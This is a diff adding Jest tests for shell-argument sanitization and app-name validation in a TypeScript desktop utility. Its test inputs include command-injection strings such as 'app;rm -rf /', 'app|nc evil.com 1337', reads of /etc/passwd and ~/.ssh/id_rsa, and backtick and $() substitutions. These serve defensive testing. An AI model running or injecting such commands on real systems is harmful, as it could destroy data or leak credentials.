@@ -28,7 +28,10 @@ import {
     ensureDir,
     fileExists,
     sleep,
-    getActiveWindowBounds
+    getActiveWindowBounds,
+    sanitizeCommandArgument,
+    isCommandArgumentSafe,
+    activateAndPasteWithNativeTool
 } from '../../src/utils/utils';
 
 import { exec } from 'child_process';
@@ -485,6 +488,232 @@ describe('Utils', () => {
 
             const result = await getActiveWindowBounds();
             expect(result).toBeNull();
+        });
+    });
+
+    describe('Command Sanitization Security', () => {
+        describe('sanitizeCommandArgument', () => {
+            test('should remove dangerous shell metacharacters', () => {
+                const dangerous = 'app;rm -rf /;echo safe';
+                const sanitized = sanitizeCommandArgument(dangerous);
+                
+                expect(sanitized).toBe('apprm -rf /echo safe');
+                expect(sanitized).not.toContain(';');
+                expect(sanitized).not.toContain('|');
+                expect(sanitized).not.toContain('`');
+                expect(sanitized).not.toContain('$');
+            });
+
+            test('should remove command injection attempts', () => {
+                const injections = [
+                    'app`whoami`',
+                    'app$(id)',
+                    'app;cat /etc/passwd',
+                    'app|nc evil.com 1337',
+                    'app&&rm -rf /',
+                    'app<script>alert(1)</script>',
+                    'app"$(malicious)"',
+                    "app'$(evil)'",
+                    'app\\$(bypass)',
+                    'app*.*',
+                    'app?.*',
+                    'app~/.ssh/id_rsa'
+                ];
+
+                injections.forEach(injection => {
+                    const sanitized = sanitizeCommandArgument(injection);
+                    expect(sanitized).not.toContain(';');
+                    expect(sanitized).not.toContain('|');
+                    expect(sanitized).not.toContain('`');
+                    expect(sanitized).not.toContain('$');
+                    expect(sanitized).not.toContain('(');
+                    expect(sanitized).not.toContain(')');
+                    expect(sanitized).not.toContain('<');
+                    expect(sanitized).not.toContain('>');
+                    expect(sanitized).not.toContain('"');
+                    expect(sanitized).not.toContain("'");
+                    expect(sanitized).not.toContain('\\');
+                    expect(sanitized).not.toContain('*');
+                    expect(sanitized).not.toContain('?');
+                    expect(sanitized).not.toContain('~');
+                    expect(sanitized).not.toContain('^');
+                });
+            });
+
+            test('should preserve safe characters', () => {
+                const safeInput = 'MyApp 1.2.3 com.example.app-name_test';
+                const sanitized = sanitizeCommandArgument(safeInput);
+                
+                expect(sanitized).toBe(safeInput);
+            });
+
+            test('should remove null bytes and newlines', () => {
+                const dangerous = 'app\x00name\r\nmalicious';
+                const sanitized = sanitizeCommandArgument(dangerous);
+                
+                expect(sanitized).toBe('appnamemalicious');
+                expect(sanitized).not.toContain('\x00');
+                expect(sanitized).not.toContain('\r');
+                expect(sanitized).not.toContain('\n');
+            });
+
+            test('should truncate long inputs', () => {
+                const longInput = 'a'.repeat(300);
+                const sanitized = sanitizeCommandArgument(longInput, 100);
+                
+                expect(sanitized.length).toBe(100);
+            });
+
+            test('should trim whitespace', () => {
+                const input = '  MyApp  ';
+                const sanitized = sanitizeCommandArgument(input);
+                
+                expect(sanitized).toBe('MyApp');
+            });
+
+            test('should throw error for non-string input', () => {
+                expect(() => sanitizeCommandArgument(null as any)).toThrow('Input must be a string');
+                expect(() => sanitizeCommandArgument(123 as any)).toThrow('Input must be a string');
+                expect(() => sanitizeCommandArgument(undefined as any)).toThrow('Input must be a string');
+            });
+        });
+
+        describe('isCommandArgumentSafe', () => {
+            test('should return false for dangerous characters', () => {
+                const dangerousInputs = [
+                    'app;malicious',
+                    'app|evil',
+                    'app`command`',
+                    'app$(command)',
+                    'app{expansion}',
+                    'app[glob]',
+                    'app<redirect',
+                    'app>redirect',
+                    'app"quoted',
+                    "app'quoted",
+                    'app\\escaped',
+                    'app*glob',
+                    'app?glob',
+                    'app~home',
+                    'app^caret',
+                    'app\x00null',
+                    'app\nnewline',
+                    'app\rcarriage',
+                    '-flag-starting-input',
+                    'app../traversal'
+                ];
+
+                dangerousInputs.forEach(input => {
+                    expect(isCommandArgumentSafe(input)).toBe(false);
+                });
+            });
+
+            test('should return true for safe inputs', () => {
+                const safeInputs = [
+                    'MyApp',
+                    'com.example.app',
+                    'App Name 1.2.3',
+                    'app_name',
+                    'app-name',
+                    'App.Name',
+                    'Simple App',
+                    'App123'
+                ];
+
+                safeInputs.forEach(input => {
+                    expect(isCommandArgumentSafe(input)).toBe(true);
+                });
+            });
+
+            test('should return false for non-string input', () => {
+                expect(isCommandArgumentSafe(null as any)).toBe(false);
+                expect(isCommandArgumentSafe(123 as any)).toBe(false);
+                expect(isCommandArgumentSafe(undefined as any)).toBe(false);
+            });
+        });
+
+        describe('activateAndPasteWithNativeTool security', () => {
+            test('should reject dangerous app names', async () => {
+                const originalPlatform = process.platform;
+                Object.defineProperty(process, 'platform', { value: 'darwin' });
+
+                // Mock exec to never be called due to validation rejection
+                (mockedExec as any).mockImplementation(() => {
+                    throw new Error('Should not reach exec call');
+                });
+
+                const dangerousAppName = 'App;rm -rf /';
+
+                await expect(
+                    activateAndPasteWithNativeTool(dangerousAppName)
+                ).rejects.toThrow('App name contains unsafe characters');
+
+                Object.defineProperty(process, 'platform', { value: originalPlatform });
+            });
+
+            test('should reject dangerous bundle IDs', async () => {
+                const originalPlatform = process.platform;
+                Object.defineProperty(process, 'platform', { value: 'darwin' });
+
+                // Mock exec to never be called due to validation rejection
+                (mockedExec as any).mockImplementation(() => {
+                    throw new Error('Should not reach exec call');
+                });
+
+                const dangerousAppInfo = {
+                    name: 'SafeApp',
+                    bundleId: 'com.example.app;malicious'
+                };
+
+                await expect(
+                    activateAndPasteWithNativeTool(dangerousAppInfo)
+                ).rejects.toThrow('Bundle ID contains unsafe characters');
+
+                Object.defineProperty(process, 'platform', { value: originalPlatform });
+            });
+
+            test('should reject empty app name after sanitization', async () => {
+                const originalPlatform = process.platform;
+                Object.defineProperty(process, 'platform', { value: 'darwin' });
+
+                const emptyAfterSanitization = ';|`$(){}[]<>"\'\\*?~^';
+
+                await expect(
+                    activateAndPasteWithNativeTool(emptyAfterSanitization)
+                ).rejects.toThrow('App name contains unsafe characters');
+
+                Object.defineProperty(process, 'platform', { value: originalPlatform });
+            });
+
+            test('should accept safe app info', async () => {
+                const originalPlatform = process.platform;
+                Object.defineProperty(process, 'platform', { value: 'darwin' });
+
+                // Mock exec to simulate successful execution
+                (mockedExec as any).mockImplementation((_command: string, _options: any, callback: ExecCallback) => {
+                    callback(null, '{"success":true,"command":"activate-and-paste-name"}', '');
+                    return null as any;
+                });
+
+                const safeAppInfo = {
+                    name: 'MyApp',
+                    bundleId: 'com.example.app'
+                };
+
+                await expect(
+                    activateAndPasteWithNativeTool(safeAppInfo)
+                ).resolves.toBeUndefined();
+
+                // Verify that the command was called with safe values
+                // Bundle ID is provided, so it should use activate-and-paste-bundle command
+                expect(mockedExec).toHaveBeenCalledWith(
+                    expect.stringContaining('activate-and-paste-bundle'),
+                    expect.any(Object),
+                    expect.any(Function)
+                );
+
+                Object.defineProperty(process, 'platform', { value: originalPlatform });
+            });
         });
     });
 });
